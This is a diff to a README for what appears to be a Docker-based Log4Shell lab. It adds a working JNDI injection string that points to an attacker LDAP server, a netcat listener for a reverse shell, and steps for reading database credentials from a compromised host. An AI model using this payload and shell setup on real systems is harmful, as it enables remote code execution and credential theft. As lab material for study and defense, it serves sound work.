@@ -19,7 +19,7 @@ Access the malicious http server at `http://localhost:8000`
 
 ### Remote Shell Exploit
 
-Startup a netcat server to listen for an incoming TCP remote shell connection `docker run snoopy-netcat-listener`, once pwned,
+Startup a netcat server to listen for an incoming TCP remote shell connection `docker compose run --name snoopy-netcat-listener snoopy-netcat-listener` and inject `${jndi:ldap://snoopy-ldap-server:1389/ExploitRCE}` once pwned,
 you can get .env values via, 
 ```
 echo $MYSQL_HOST
@@ -27,6 +27,8 @@ mysql-database
 echo $MYSQL_ROOT_PASSWORD 
 secret
 ```
+
+IT IS ESSENTIAL TO NOT USE DOCKER COMPOSE UP SNOOPY-NETCAT-LISTENER, see [this SO thread](https://stackoverflow.com/questions/36249744/interactive-shell-using-docker-compose).
 
 Dependencies : 
 
